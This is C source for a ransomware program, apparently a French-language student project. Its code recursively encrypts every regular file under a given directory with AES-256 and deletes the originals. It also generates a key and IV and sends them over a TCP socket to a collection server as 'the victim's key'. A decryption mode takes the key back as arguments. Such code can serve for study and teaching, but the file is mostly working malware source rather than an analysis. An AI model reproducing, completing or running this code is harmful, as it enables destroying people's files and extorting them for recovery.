#include "ransomlib.h"
#include <dirent.h> 
#include <sys/socket.h> // for socket
#include <unistd.h> 
#include <arpa/inet.h>

#define ip "127.0.0.1"
#define port 8080

void usage()
{
	printf("--------------------------------------\n");
	printf("Bienvenue sur le projet de Ransomware\n");
	printf("--------------------------------------\n");
};

int is_encrypted(char *filename)
// ici on assume que le nom de nos fichiers cryptés seront en ".crp"
{
	int n = strlen(filename)-4;
	char extention[4] ;

	for(int i=0; i<5;i++)
	{
		extention[i] = filename[n+i];
	}

	if(strcmp(extention,".crp")==0)
	{
		printf("Le fichier est déja crypter");
		return 0 ;
	}
	else
	{
		printf("Le fichier n'est pas encore crypter");
		// lancer une copie du fichier
		// const char * command = "cp %s",filename;
		// crypter
		// mettre le ".crp"
		// supprimer fichier origin
		return 1;
	}
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
{
	DIR* dir = opendir(name);
	
	if (dir == NULL)
	{
		handleErrors();
	}
	
	struct dirent* entity;
	entity = readdir(dir);
	
	while (entity != NULL)
	{
		
		 if (entity->d_name[0] != '.')
		{
			//printf("[type of folder : %d]  %s/%s\n",entity->d_type,name,entity->d_name);			
			if(entity->d_type == DT_DIR && strcmp(entity->d_name,".")!=0 && strcmp(entity->d_name,"..")!=0)
			{
				char path[BUFSIZE] = {0};
				strcat(path,name);
				strcat(path,"/");
				strcat(path,entity->d_name);
				if(de_flag=='e')
				{
					listdir(path, iv, key, 'e');
				}
				
				if(de_flag=='d')
				{
					listdir(path, iv, key, 'd');
				}
			}
			
			if(de_flag=='e' && entity->d_type == DT_REG)
			{
				char twooo[BUFSIZE] = "";
				strcat(twooo,name);
				strcat(twooo,"/");
				strcat(twooo,entity->d_name);
				encrypt(key, iv,twooo);
				
				// char quatre[BUFSIZE] = "";
				// strcat(quatre, twooo);
				// strcat(quatre, ".Pwnd");
				
				remove(twooo);
				// decrypt(key, iv, quatre);
				// remove(quatre);
			}
			
			else if(de_flag=='d' && entity->d_type == DT_REG)
			{
				char troiii[BUFSIZE] = "";
				strcat(troiii,name);
				strcat(troiii,"/");
				strcat(troiii,entity->d_name);
				// strcat(troiii, ".Pwnd");

				// printf("%s \n", troiii);
				decrypt(key, iv, troiii);
				remove(troiii);
			}
		}
		
		entity = readdir(dir);
	}
	closedir(dir);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
	if (!RAND_bytes(key, sizeKey) || !RAND_bytes(iv, sizeIv)) 
	{
		// fprintf(stderr, "L'erreur est %s\n", strerror(errno));
		// return errno;		
		handleErrors();
	}
	
	bytes_to_hexa(key , pKey, sizeKey);
	bytes_to_hexa(iv , pIv, sizeIv);
	
	// OPENSSL_cleanse(key,sizeof(key));	
	// OPENSSL_cleanse(iv,sizeof(iv));
}

int send_key(char *pKey, char *pIv)
{
	int sockID;
	
	sockID = socket(AF_INET,SOCK_STREAM,0);

	struct sockaddr_in serveraddr;
	serveraddr.sin_family = AF_INET;
	serveraddr.sin_port = htons(port);
	serveraddr.sin_addr.s_addr = inet_addr(ip);

	char *send_key = "La clé de la victime: ";
	char *send_iv = "L'IV de la victime: ";
	char *space = "\t \n";
	
	// connect the client socket to server socket	
	if (connect(sockID, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) != 0) 
	{
		printf("Connection with the server failed !\n");
		exit(0);
	}
	else
	{
		printf("Connected to the server !\n");		
		send(sockID, (const char *)send_key, strlen(send_key),0);
		send(sockID, (const char *)pKey, strlen(pKey),0);
		send(sockID, (const char *)space, strlen(space),0); //Eviter que la clé soit mélangé avec le texte qui suit
		send(sockID, (const char *)send_iv, strlen(send_iv),0);
		send(sockID, (const char *)pIv, strlen(pIv),0);
	}
	close(sockID);
}

int main (int argc, char * argv[])
{
	if(argc==1)
	{
		usage();
		printf("./ransom PATH \n");
	}
	
	else if(argc==5 || argc==3)
	{
		unsigned char key[AES_256_KEY_SIZE];
		unsigned char iv[AES_BLOCK_SIZE];

		int sizeKey = AES_256_KEY_SIZE; 
		int sizeIv = AES_BLOCK_SIZE;
		
		char * pKey = (char *) malloc(sizeof(key)*2+1);
		char * pIv = (char *) malloc(sizeof(iv)*2+1);
		
		if(strcmp(argv[2], "-enc")==0) 
		{
			printf("The directory is %s\n", argv[1]);
			
			generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
			send_key(pKey, pIv);
			listdir(argv[1], iv, key, 'e');
		}
		
		if (strcmp(argv[2], "-dec")==0)
		{
			hexa_to_bytes(argv[3] , key, sizeKey);
			hexa_to_bytes(argv[4] , iv, sizeIv);
			listdir(argv[1], iv, key, 'd');
			
			free((char *)pKey);
			free((char *)pIv);
			// printf("test");
		}
		
	}
}

